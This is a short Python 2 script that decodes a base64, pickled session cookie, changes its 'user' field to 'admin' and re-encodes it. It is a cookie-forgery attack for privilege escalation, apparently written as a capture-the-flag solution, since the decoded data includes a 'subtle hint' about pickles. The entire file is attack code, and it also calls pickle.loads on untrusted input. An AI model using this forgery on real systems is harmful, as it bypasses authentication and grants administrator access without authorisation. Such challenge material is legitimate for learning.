#!/usr/bin/env python2

import pickle
import base64

cookie_data = 'KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'
z = pickle.loads(base64.b64decode(cookie_data))

z['user'] = 'admin'

cookie_data = base64.b64encode(pickle.dumps(z))
print(cookie_data)
